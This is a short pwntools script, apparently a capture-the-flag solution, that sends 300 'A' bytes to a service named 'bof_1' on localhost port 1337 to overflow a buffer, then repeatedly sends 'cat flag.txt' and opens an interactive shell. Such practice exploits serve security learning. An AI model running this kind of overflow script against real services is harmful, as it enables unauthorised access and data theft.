#!/usr/bin/env python3

from pwn import *

#p = process("./bof_1")
p = remote("127.0.0.1", 1337)

p.sendline(b"A" * 300)
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.sendline(b"cat flag.txt")
p.interactive()
